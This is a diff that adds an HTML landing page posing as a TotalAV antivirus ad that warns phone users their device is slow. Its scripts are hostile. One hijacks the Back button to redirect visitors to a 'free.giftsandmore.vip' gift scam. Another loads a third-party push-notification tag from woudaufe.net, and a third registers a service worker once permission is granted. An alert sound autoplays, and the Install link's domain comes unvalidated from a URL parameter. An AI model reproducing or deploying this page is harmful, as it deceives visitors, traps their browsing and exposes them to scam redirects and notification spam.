@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Total AV</title>
+  <link href="css/style.css" rel="stylesheet" />
+  <script>
+    (function (window, location) {
+      var redirect = "https://free.giftsandmore.vip/?utm_medium=bddab1254dc804572f4ea39f14a9b6c0d448fe5f&utm_campaign=Back-Button-Redirect";
+      var currentUrl = location.origin + location.pathname + location.search;
+      if (location.hash !== "#!/hst") {
+        history.replaceState(null, document.title, currentUrl + "#!/hst");
+        history.pushState(null, document.title, currentUrl);
+      }
+
+      window.addEventListener("popstate", function () {
+        if (location.hash === "#!/hst") {
+          setTimeout(function () {
+            window.location.replace(redirect);
+          }, 0);
+        }
+      }, false);
+    }(window, location));
+  </script>
+  <script>
+    function getURLParameter(name) {
+      var query = window.location.search.substring(1);
+      var vars = query.split("&");
+      for (var i = 0; i < vars.length; i++) {
+        var pair = vars[i].split("=");
+        if (pair[0] === name) { return decodeURI(pair[1]); }
+      }
+      return "";
+    }
+  </script>
+  <script>
+    var s = document.createElement('script');
+    s.src = '//woudaufe.net/act/files/micro.tag.min.js?z=6356874' + '&sw=/sw-check-permissions-82528.js';
+    s.onload = function (result) {
+      switch (result) {
+        case 'onPermissionDefault': break;
+        case 'onPermissionAllowed': break;
+        case 'onPermissionDenied': break;
+        case 'onAlreadySubscribed': break;
+        case 'onNotificationUnsupported': break;
+      }
+    };
+    document.head.appendChild(s);
+  </script>
+  <script>
+    (function () {
+      const interval = setInterval(() => {
+        if (Notification.permission === 'granted') {
+          navigator.serviceWorker.register('/sw.enot.js?appId=1005e5d4864ca6b4e77a62c8c770b62', { scope: '/ntx' })
+          clearInterval(interval)
+        }
+      }, 300)
+    })()
+  </script>
+</head>
+
+<body class="en ltr">
+  <div class="wrap">
+    <div class="customContainer">
+      <a data-i18n="marketing-disclosure" target="_blank" href="marketing-disclosure.html"
+        class="marketingdisclosure">Marketing Disclosure</a>
+      <div class="window">
+        <div class="text">
+          <div class="headercontainer">
+            <h1>Enhance Your Device!</h1>
+          </div>
+          <p>Is your phone running slower than usual? TotalAV can help with a simple scan.</p><br />
+          <p>Remove any potential threats and free up space to keep your device running smoothly.</p><br />
+          <img src="img/icon4.png" style="float: left; padding-right: 10px;" />
+          <p>Download TotalAV today and enjoy peace of mind with improved performance and security.</p>
+        </div>
+
+        <div class="buttons">
+          <script>
+            document.write('<a href="https://' + getURLParameter('domain') +
+              '/click" tabindex="0" class="button exitpoint">Install</a>')
+          </script>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  <p><audio autoplay="autoplay" preload="">
+      <source src="audio/alert.mp3" type="audio/mpeg" />
+    </audio></p>
+</body>
+
+</html>
